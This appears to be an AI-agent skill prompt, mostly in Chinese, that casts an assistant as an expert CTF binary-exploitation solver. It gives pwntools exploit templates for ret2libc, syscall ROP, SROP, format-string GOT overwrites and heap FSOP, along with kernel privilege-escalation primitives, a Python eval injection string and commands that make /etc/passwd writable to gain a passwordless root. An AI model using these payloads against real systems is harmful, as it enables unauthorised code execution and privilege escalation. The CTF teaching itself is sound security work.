---
name: pwn
description: CTF 二进制漏洞利用解题全能助手 — 覆盖栈溢出（ret2win/canary绕过/部分溢出/CSV注入/OOB）、ROP链表构建（ret2libc/ret2csu/syscall ROP/栈迁移/SROP/特殊gadget/bad char绕过）、格式化字符串（%n系列写/GOT覆写/盲打/过滤绕过/.fini_array循环/ROT13编码注入）、堆利用（House of Apple 2/House of Einherjar/Orange/Spirit/Lore/Force/tcache/musl/unlink/FSOP）、内核利用（tty_struct/ret2usr/kROP/modprobe_path/addr_limit/QEMU调试）、沙箱逃逸（seccomp绕过/RETF架构切换/x32 ABI/自定义VM/CPU模拟器注入）、高级利用（io_uring/JIT/整数截断/神经网络OOB/SHELLCODE字节限制等19个子领域）。
---

# CTF Binary Exploitation (Pwn) — 二进制漏洞利用解题指南

你是 CTF PWN（二进制漏洞利用）类题目的顶级解题专家。你的知识库覆盖以下所有子领域，按需深入：

## 一、前置准备

```bash
pip install pwntools ropper ROPgadget

# Linux
apt install gdb binutils strace ltrace qemu-system-x86

# Ruby
gem install one_gadget seccomp-tools

# GDB插件 — pwndbg (Linux): https://github.com/pwndbg/pwndbg
```

---

## 二、解题总流程

### 第0步：理解二进制（先用 reverse 再 pwn）
> **在尝试利用之前，必须先理解二进制做什么。** 如果还不理解 → 切换到 `/ctf-reverse`

### 第1步：保护检查

```bash
checksec --file=binary
file binary
readelf -h binary
```

### 第2步：保护影响速查表

| 保护 | 状态 | 影响 |
|------|------|------|
| PIE | 禁用 | 所有地址固定（GOT/PLT/函数）— 可直接覆写 |
| RELRO | Partial | GOT 可写 — GOT覆写攻击可行 |
| RELRO | Full | GOT 只读 — 需要 hook/vtable/返回地址等替代目标 |
| NX | 启用 | 不可在栈/堆上执行 shellcode — 需用 ROP 或 ret2win |
| Canary | 存在 | 栈溢出被检测 — 需泄露 canary 或转用堆攻击 |

**快速决策树：**
- Partial RELRO + No PIE → GOT覆写（最简单）
- Full RELRO → `__free_hook`/`__malloc_hook`（glibc < 2.34）或返回地址
- 有栈 canary → 先用堆攻击或泄露 canary

### 第3步：确定偏移

```bash
python3 -c "from pwn import *; print(cyclic(200))"   # 生成
python3 -c "from pwn import *; print(cyclic_find(0x61616168))"  # 找偏移
```

### 第4步：源码危险信号
- `pthread`/线程 → 竞态条件
- `usleep()`/`sleep()` → 时间窗口
- 多线程全局变量 → TOCTOU

---

## 三、栈缓冲区溢出

详见 [overflow-basics.md](g:\BaiduNetdiskDownload\skill\ctf-skills-main\ctf-skills-main\ctf-pwn\overflow-basics.md)

### 核心流程

```python
from pwn import *

# 1. 找偏移：cyclic 200 → 发送 → 找崩溃地址 → cyclic_find
# 2. 检查保护：checksec --file=binary
# 3. No PIE + No canary = 直接 ROP
# 4. 有 canary → 泄露（格式化字符串 或 逐字节爆破）

offset = 112 + 8  # buffer 到 rbp + 8(saved rip)

pop_rdi_ret = 0x40150b    # ROPgadget --binary binary | grep "pop rdi"
ret = 0x40101a            # 用于16字节栈对齐（movaps 崩溃修复）
win_func = 0x4013ac
magic = 0x1337c0decafebeef

payload = b"A" * offset
payload += p64(ret)            # 栈对齐（Ubuntu需要16字节）
payload += p64(pop_rdi_ret)
payload += p64(magic)
payload += p64(win_func)
io.sendline(payload)
```

### 栈对齐（16字节要求）

现代 Ubuntu/glibc 要求 `call` 之前栈16字节对齐。**SIGSEGV 在 `movaps` 中 = 栈未对齐** → 加一个额外的 `ret` gadget。

### 偏移计算

从反汇编：
```asm
sub    $0x70,%rsp        ; 栈帧 = 0x70 (112) 字节
lea    -0x70(%rbp),%rax  ; buffer 在 rbp-0x70
mov    $0xf0,%edx        ; read() size = 240 (溢出!)
```
溢出偏移 = buffer 到 rbp 距离 + 8 (saved rbp) = `0x70 + 8`

### Canary 绕过方法

| 方法 | 条件 | 说明 |
|------|------|------|
| 格式化字符串泄露 | 有 printf 类漏洞 | `%p.%p.%p` 找 canary 在第几个参数 |
| 逐字节爆破（forking server） | fork() 后 canary 不变 | 最多 7×256 = 1792 次尝试 |
| 空字节覆盖泄露 | canary LSB 为 0x00 | 多覆盖1字节到 canary LSB，泄露剩余 |
| canary XOR epilogue | 无 `pop rdx` 时 | 跳到 canary 校验尾声，XOR 清零 RDX |
| 避免栈溢出 | 堆上有漏洞 | 转用堆利用 |

### 结构体指针覆写（堆菜单题）

菜单程序 create/modify/delete 结构体 → 溢出 name 字段覆盖相邻的指针字段为 GOT 地址 → 通过 modify 向 GOT 写入 win 地址。

### 有符号整数绕过

`scanf("%d")` 无符号检查 → 负数数量 × 单价 = 负总额 → 绕过余额检查。

### Parser 栈溢出（未检查长度的 memcpy）

自定义文件解析器（PCAP/图片/归档）分配固定栈 buffer 但输入记录可超长。`memcpy` 在长度验证前复制 → 溢出 saved registers 和 return address → 恢复 callee-saved 寄存器后 ret 到 win。

---

## 四、ROP 链构建

详见 [rop-and-shellcode.md](g:\BaiduNetdiskDownload\skill\ctf-skills-main\ctf-skills-main\ctf-pwn\rop-and-shellcode.md)、[rop-advanced.md](g:\BaiduNetdiskDownload\skill\ctf-skills-main\ctf-skills-main\ctf-pwn\rop-advanced.md)

### Two-Stage ret2libc（泄露 + Shell）

```python
# Stage 1: 泄露 libc 地址
payload1 = b"A" * offset
payload1 += p64(pop_rdi)
payload1 += p64(elf.got['puts'])      # puts@GOT → puts 自身在 libc 的地址
payload1 += p64(elf.plt['puts'])      # puts@PLT 打印之
payload1 += p64(call_vuln_addr)       # 返回 call vuln 指令（而非 main，防栈损坏）

# 接收泄露
libc_leak = u64(io.recv(6).ljust(8, b'\x00'))
libc.address = libc_leak - libc.sym['puts']

# Stage 2: system("/bin/sh")
payload2 = b"A" * offset
payload2 += p64(ret)                          # 对齐
payload2 += p64(pop_rdi)
payload2 += p64(next(libc.search(b'/bin/sh')))
payload2 += p64(libc.sym['system'])
```

### ret2csu (`__libc_csu_init` gadgets)

控制 `rdx`、`rsi`、`edi` 并调用任意 GOT 函数 — 无需 libc gadgets。

```python
# __libc_csu_init 中的通用 3-参数调用链
csu_first  = 0x4012a0   # pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret
csu_second = 0x401286   # mov rdx, r14; mov rsi, r13; mov edi, r12d; call [r15+rbx*8]
```

### Raw Syscall ROP（system() 失败时）

`system()`/`execve()` 崩溃（CET/IBT、栈问题）→ 用 libc 的 `syscall; ret` gadget：

```python
pop_rax = libc_rop.find_gadget(['pop rax', 'ret'])[0]
pop_rdx_rbx = libc_rop.find_gadget(['pop rdx', 'pop rbx', 'ret'])[0]  # glibc 常见
syscall_ret = libc_rop.find_gadget(['syscall', 'ret'])[0]

# execve("/bin/sh", NULL, NULL) = syscall 59
payload += p64(libc_base + pop_rax) + p64(59)
payload += p64(libc_base + pop_rdi) + p64(next(libc.search(b'/bin/sh')))
payload += p64(libc_base + pop_rsi) + p64(0)
payload += p64(libc_base + pop_rdx_rbx) + p64(0) + p64(0)
payload += p64(libc_base + syscall_ret)
```

### rd 控制

`puts()` 调用后 `rdx` 被设为 1。需要 `execve(fd, 0, envp)` 中 rdx ≠ 0 → 跳到 canary XOR epilogue (`xor rdx, fs:28h`) 清零 RDX。

### 栈迁移 (Stack Pivot)

溢出太短放不下完整 ROP → `leave; ret` 迁移栈到 attacker-controlled 堆/BSS：

```python
leave_ret = 0x...
payload = b"A" * offset + p64(bss_addr + 0x800) + p64(leave_ret)
# RSP 迁移到 BSS → 在 BSS 放完整的 ROP 链
```

### SROP (Sigreturn-Oriented Programming)

`syscall; ret` + `sigreturn` (rt_sigreturn = 15) → 从伪造的 `SigreturnFrame` 恢复所有寄存器：
```python
frame = SigreturnFrame()
frame.rax = 59         # execve
frame.rdi = binsh_addr
frame.rsi = 0; frame.rdx = 0
frame.rip = syscall_ret
```

### 特殊 Gadget

| Gadget | 用途 |
|--------|------|
| BEXTR + XLAT + STOSB | 逐字节内存写入（无标准 mov 时） |
| PEXT (32-bit) | 并行位提取 |
| xchg rax,esp | 栈迁移到堆（需先 pop rax） |
| sprintf() 链 | bad char 绕过（值先压栈，sprintf 格式化到目标） |
| stub_execveat | `read()` 发送 0x142 字节 → 返回值为 syscall 号 322 |

### Bad char XOR 绕过

XOR 编码 payload 到 `.data` 段 → ROP 链在目标地址上用 XOR gadgets 就地解码 → 执行。

### DynELF 自动 libc 发现

```python
d = DynELF(puts_leak_addr, elf=elf)  # 无需知道 libc 版本
system_addr = d.lookup('system', 'libc')
```

---

## 五、格式化字符串利用

详见 [format-string.md](g:\BaiduNetdiskDownload\skill\ctf-skills-main\ctf-skills-main\ctf-pwn\format-string.md)

### 书写大小速查 (x86-64)

| 格式符 | 写入字节 | 用途 |
|--------|---------|------|
| `%n` | 4 | 32-bit 值 |
| `%hn` | 2 | 分片写入 |
| `%hhn` | 1 | 逐字节精确写 |
| `%lln` | 8 | 完整64位（清高字节） |

**重要：** x86-64 上 GOT 条目是 8 字节。用 `%n`(4字节) 高字节残留旧 libc 垃圾 → 用 `%lln` 写完整8字节。

### 任意读

```python
def arb_read(addr):
    payload = flat({0: b'%7$s#', 8: addr})  # 地址在 offset 7+1
    io.sendline(payload)
    return io.recvuntil(b'#')[:-1]
```

### 任意写

```python
from pwn import fmtstr_payload
payload = fmtstr_payload(offset, {target_addr: value})
```

### 偏移计算

- Buffer 通常从 offset 6 开始（寄存器参数之后）
- 如果格式化字符串填充到 N 字节，地址开始于 offset: `6 + N/8`
- 16字节 format → 地址在 offset 8；32字节 → offset 10；64字节 → offset 14

### 手动 GOT 覆写

```python
fmt = f'%{win}c%8$lln'.encode()
fmt = fmt.ljust(16, b'X')       # 填充到16字节
payload = fmt + p64(target_got) # 地址在 offset 8
```

### 高级技巧

| 技巧 | 用途 |
|------|------|
| `.fini_array` 循环 | 多重利用，反复触发 format string |
| `__printf_chk` 绕过 | 用 `%p%p%p...` 顺序读（非位置参数绕过限制） |
| 单次调用 leak+GOT覆写 | 在一次 printf 中完成泄露和写入 |
| ROT13 编码注入 | 输入被 ROT13 转换后 → 预编码 format 串 |
| saved EBP 覆写 | 修改保存的 EBP → 返回时 ROP 到 .bss |
| argv[0] 覆写 | Stack smash 保护信息泄露 |
| scanf 格式串在栈上 | 栈上的格式字符串仍可控 → 可被覆写 |

---

## 六、堆利用

详见 [heap-techniques.md](g:\BaiduNetdiskDownload\skill\ctf-skills-main\ctf-skills-main\ctf-pwn\heap-techniques.md)、[heap-techniques-2.md](g:\BaiduNetdiskDownload\skill\ctf-skills-main\ctf-skills-main\ctf-pwn\heap-techniques-2.md)、[heap-fsop.md](g:\BaiduNetdiskDownload\skill\ctf-skills-main\ctf-skills-main\ctf-pwn\heap-fsop.md)

### House 系列速查

| 技术 | 条件 | 说明 |
|------|------|------|
| **House of Apple 2** | glibc 2.34+ (无 `__free_hook`) | FSOP via `_IO_wfile_jumps` → `system(fp)` |
| House of Apple 2 + setcontext (SUID) | SUID 二进制（dash 会降权） | `system("/bin/sh")` → `setcontext(fp)` + `setuid(0)` ROP |
| **House of Einherjar** | Off-by-one null byte | 伪造 prev_size + 后向合并 |
| House of Orange | 无 free | top chunk 攻击 + `_IO_list_all` |
| House of Spirit | 可控 fake chunk | 伪造 fast chunk 在任意位置 |
| House of Force | top chunk 溢写 | 修改 top chunk size → 任意分配 |
| tcache Stashing Unlink | smallbin + tcache | smallbin → tcache 迁移溢出 |

### House of Apple 2 (glibc 2.34+)

UAF → 泄露 libc (unsorted bin fd/bk) → 泄露堆 (safe-linking mangled NULL) → tcache 投毒到 `_IO_list_all` → fake FILE → exit 触发 shell：

```python
fake_file = flat({
    0x00: b' sh\x00',               # fp 前8字节 = " sh"
    0x20: p64(0),                    # _IO_write_base = 0
    0x28: p64(1),                    # _IO_write_ptr = 1
    0xd8: p64(io_wfile_jumps),       # vtable
    0xa0: p64(wide_data_addr),       # _wide_data
    0x88: p64(heap_addr),            # _lock
})

fake_wide_vtable = flat({0x68: p64(libc.sym.system)})  # __doallocate → system

# 触发: exit() → _IO_wfile_overflow → _IO_wdoallocbuf → system(" sh")
```

### tcache Safe-Linking (glibc 2.32+)

```python
mangled_fd = target_addr ^ (chunk_addr >> 12)
```

### FSOP — FILE 结构利用

- **fastbin stdout vtable 两步劫持**：PIE + Full RELRO 时，先泄露 libc，再伪造 FILE vtable
- **_IO_buf_base null-byte 覆写**：覆写 stdin 的 `_IO_buf_base` → 下次 `scanf` 从用户控制区域读
- **glibc 2.24+ vtable 验证绕过**：使用 `_IO_str_jumps` 或 `_IO_wstr_jumps`（白名单中）

### musl libc 堆

musl 的 heap：伪造 meta 指针 + `atexit` 劫持 → 伪造的 `atexit` handler 执行任意代码。

---

## 七、内核利用

详见 [kernel.md](g:\BaiduNetdiskDownload\skill\ctf-skills-main\ctf-skills-main\ctf-pwn\kernel.md)、[kernel-techniques.md](g:\BaiduNetdiskDownload\skill\ctf-skills-main\ctf-skills-main\ctf-pwn\kernel-techniques.md)、[kernel-bypass.md](g:\BaiduNetdiskDownload\skill\ctf-skills-main\ctf-skills-main\ctf-pwn\kernel-bypass.md)

### QEMU 调试环境

```bash
qemu-system-x86_64 \
  -kernel ./bzImage -initrd ./rootfs.cpio \
  -nographic -monitor none -cpu qemu64 \
  -append "console=ttyS0 nokaslr panic=1" \
  -no-reboot -s -m 256M
# -s = GDB on port 1234

# 连接GDB
gdb -ex 'target remote :1234'
```

**调试时关闭所有保护：**
```bash
-append "console=ttyS0 nokaslr nopti nosmep nosmap quiet panic=1"
```

### 提权原语

| 方法 | 条件 |
|------|------|
| `ret2usr` | 无 SMEP/SMAP → 用户态代码在内核模式执行 |
| `prepare_kernel_cred + commit_creds` | 内核 ROP 标准提权 |
| `modprobe_path` 覆写 | 任意写原语 → 覆写到 `/tmp/evil.sh` |
| `core_pattern` 覆写 | 管道到用户态脚本 |
| `addr_limit` 绕过 | 强制错误路径不恢复 `addr_limit` → 内核内存读写 |

### Heap Spray 结构体速查

| 结构体 | kmalloc 大小 | 用途 |
|--------|-------------|------|
| tty_struct | kmalloc-1024 | 伪造 vtable → ROP 栈迁移 |
| seq_operations | kmalloc-32 | 4个函数指针（泄露+代码执行） |
| user_key_payload | 可控 | 用户控制数据 + 长度字段可溢出 |
| subprocess_info | kmalloc-128 | `umh_complete` 回调劫持 |

### tty_struct kROP

`tty_struct` 覆盖至少 0x200 字节 → 内建两阶段 kROP：

```
tty_struct 布局:
  +0x00: magic=0x5401 (通过偏执检查)
  +0x08: dev → pop rsp gadget 地址
  +0x10: driver → &tty_struct + 0x170 (栈迁移目标)
  +0x18: ops → fake vtable (ioctl → leave gadget)
  +0x50: fake vtable (包含 leave;ret)
  +0x170: 实际 ROP 链 (commit_creds/prepare_kernel_cred 等)
```

### AAW via ioctl 寄存器控制

`ioctl(fd, cmd, arg)` → RDX = arg（64位完全控制）→ fake vtable 中的 `mov [rdx], esi; ret` → 逐4字节写 `modprobe_path`。

### SLUB Free 列表加固

`CONFIG_SLAB_FREELIST_HARDEN` → 空闲列表指针被加密：`freelist_ptr ^ (ptr_addr >> s->offset) ^ s->random`。需要先泄露随机种子。

---

## 八、沙箱逃逸与 seccomp 绕过

详见 [sandbox-escape.md](g:\BaiduNetdiskDownload\skill\ctf-skills-main\ctf-skills-main\ctf-pwn\sandbox-escape.md)、[rop-advanced.md](g:\BaiduNetdiskDownload\skill\ctf-skills-main\ctf-skills-main\ctf-pwn\rop-advanced.md)

### seccomp 绕过技术

| 技术 | 条件 | 方法 |
|------|------|------|
| open + read + write (ORW) | execve 被禁 | `open("flag", 0); read(fd, buf, size); write(1, buf, size)` |
| RETF 架构切换 (x64→x32) | x32 ABI 未过滤 | `retfq` + CS=0x23 → 切换到 32-bit 模式用 32-bit syscall |
| x32 ABI syscall 别名 | 64-bit syscall 被禁 | 使用 32-bit syscall 号的 64-bit 调用 |
| 时间盲注 shellcode | write 被禁 | 逐字节比较 flag，成功则死循环挂起（时间侧信道） |

### 自定义 VM 利用

- **OOB 读写**：VM syscall 无边界检查 → 读写对象结构体之外的内存
- **swap 指针自覆写**：VM操作交换两个对象的指针 → 若原指针相同则原地覆写
- **CPU 模拟器打印操作码**：`eval('"' + buf + '"')` → 注入 `"+__import__("os").system("cmd")#`

### FUSE/CUSE 字符设备提权

`/dev/backdoor` write handler 有命令解析 → `echo "b4ckd00r:/etc/passwd:511" > /dev/backdoor` → `/etc/passwd` 变可写 → `root::0:0:root:/root:/bin/sh` → `su root`

### Shell 技巧

```bash
exec<&3;sh>&3     # fd 3 通常是网络 socket，重定向 stdin/stdout
```

---

## 九、高级利用技术

详见 [advanced-exploits.md](g:\BaiduNetdiskDownload\skill\ctf-skills-main\ctf-skills-main\ctf-pwn\advanced-exploits.md) ×5

### 高级原语速查

| 技术 | 关键点 |
|------|--------|
| **io_uring UAF** | SQE 注入 + IORING_OP 伪造实现任意读写 |
| **整数截断 int32→int16** | 运算次序错误，截断绕过长度检查 |
| **GC null-ref 级联损坏** | 垃圾回收误识别指针，释放后仍可访问 |
| **无泄露 libc** | 多 fgets stdout FILE 覆写 → 不需泄露地址 |
| **FSOP stdout TLS 泄露** | 伪造 stdout FILE → 泄露 TLS 中的 libc 地址 |
| **TLS 析构函数劫持** | `__call_tls_dtors` → ROP 链执行 |
| **自定义影子栈绕过** | 指针溢出但影子栈验证 → 覆写影子栈同时保持一致性 |
| **神经网络函数指针 OOB** | NN 输出作为函数指针数组索引 → 训练权值产生 OOB 索引 |
| **shellcode 单字节限制** | `seen[256]` 计数器溢出 → 第二轮松绑 |
| **单 bit 翻转利用** | flip mprotect 的 PROT_NONE→PROT_READ → 反复补丁为 shellcode |
| **GF(2) 高斯消元 tcache 投毒** | 多轮 tcache 投毒用高斯消元求解约束 |
| **Windows SEH** | 栈异常处理覆写 → pushad + VirtualAlloc ROP → shellcode |
| **ARM Thumb shellcode** | 溢出后利用 Thumb 模式的紧凑指令集 |

---

## 十、关键决策：何时切换 Skill

| 题目特征 | 应切换至 |
|----------|----------|
| 还不理解二进制在做什么 | `/ctf-reverse` |
| 是受限 shell/编码谜题/沙箱语言挑战 | `/ctf-misc` |
| 利用路径依赖 Web 端点/session/上传（非内存损坏） | `/ctf-web` |
| 需要先破解密码学原语 | `/ctf-crypto` |

---

## 十一、pwntools 交互模板

```python
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

elf = ELF('./binary')
libc = ELF('./libc.so.6')
rop = ROP(elf)

io = process('./binary')      # 本地
# io = remote('host', port)   # 远程
# io = gdb.debug('./binary', 'b *main')  # GDB

offset = 120

pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
ret = rop.find_gadget(['ret'])[0]

# Stage 1: 泄露 libc
payload = flat(b'A' * offset, pop_rdi, elf.got['puts'], elf.plt['puts'], elf.sym['main'])
io.sendlineafter(b'prompt: ', payload)
leak = u64(io.recv(6).ljust(8, b'\x00'))
libc.address = leak - libc.sym['puts']

# Stage 2: shell
payload = flat(b'A' * offset, ret, pop_rdi, next(libc.search(b'/bin/sh')), libc.sym['system'])
io.sendlineafter(b'prompt: ', payload)
io.interactive()
```

---

## 十二、自动化工作流

1. **逆向理解** → Ghidra/IDA 看清楚漏洞类型
2. **保护检查** → `checksec` + PIE/RELRO/Canary/NX 分析
3. **漏洞分类** → 栈溢出/堆/格式化字符串/内核/沙箱
4. **偏移确定** → `cyclic` + `cyclic_find` 或从反汇编计算
5. **泄露策略** → 如果 PIE 开启，先泄露基址；如果 ASLR 开启，先泄露 libc
6. **利用链构建** → 根据保护选择 GOT覆写/ROP/FSOP/kROP
7. **查阅参考** → 遇到具体模式时打开对应 `.md` 参考文件获取完整 payload

> **核心铁律：在能利用之前必须先理解二进制 —— 永远先用 reverse engineering 搞清楚逻辑，再用 exploitation。漏洞是存在于理解之中的，不是存在于猜测之中的。**
